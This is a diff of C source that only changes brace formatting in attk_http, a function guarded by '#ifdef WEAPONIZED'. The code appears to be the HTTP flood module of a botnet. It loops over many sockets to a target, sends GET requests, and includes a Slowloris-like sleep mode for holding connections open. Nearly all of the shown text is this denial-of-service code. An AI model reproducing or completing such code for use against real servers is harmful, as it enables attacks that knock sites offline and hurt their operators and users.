@@ -2,12 +2,10 @@
 
 #ifdef WEAPONIZED
 
-void attk_http(uint32_t max, uint16_t port, uint8_t mode, uint16_t sleeptime, char *dir)
-{
+void attk_http(uint32_t max, uint16_t port, uint8_t mode, uint16_t sleeptime, char *dir) {
 	uint32_t i;
 
-	struct http_t
-	{
+	struct http_t {
 		int32_t sock; // Shouldn't be unsigned
 		uint16_t sleep;
 		uint8_t state;
@@ -18,20 +16,15 @@ void attk_http(uint32_t max, uint16_t port, uint8_t mode, uint16_t sleeptime, ch
 	addr.sin_family = AF_INET;
 	addr.sin_port = htons(port); // Set our port
 
-	for (i = 0; i < max; i++)
-	{
+	for (i = 0; i < max; i++) {
 		http[i].state = 0;
 		http[i].sleep = sleeptime;
 	}
 
-	while (1)
-	{
-		for (i = 0; i < max; i++)
-		{
-			switch (http[i].state)
-			{
-				case 0:
-				{
+	while (1) {
+		for (i = 0; i < max; i++) {
+			switch (http[i].state) {
+				case 0: {
 					// Connect
 					http[i].sock = socket(AF_INET, SOCK_STREAM, 0);
 					if (http[i].sock == (int32_t) -1)
@@ -44,8 +37,7 @@ void attk_http(uint32_t max, uint16_t port, uint8_t mode, uint16_t sleeptime, ch
 					http[i].state = 1;
 					continue; // Move to next i
 				}
-				case 1:
-				{
+				case 1: {
 					// Send data
 					char *message;
 					asprintf(&message, "GET %s\r\n\r\n", dir);
@@ -60,8 +52,7 @@ void attk_http(uint32_t max, uint16_t port, uint8_t mode, uint16_t sleeptime, ch
 
 					continue; // Move to next i
 				}
-				case 2:
-				{
+				case 2: {
 					// Sleep until we need to send data
 					// This is only if we are using a slowlorious
 					// like attack
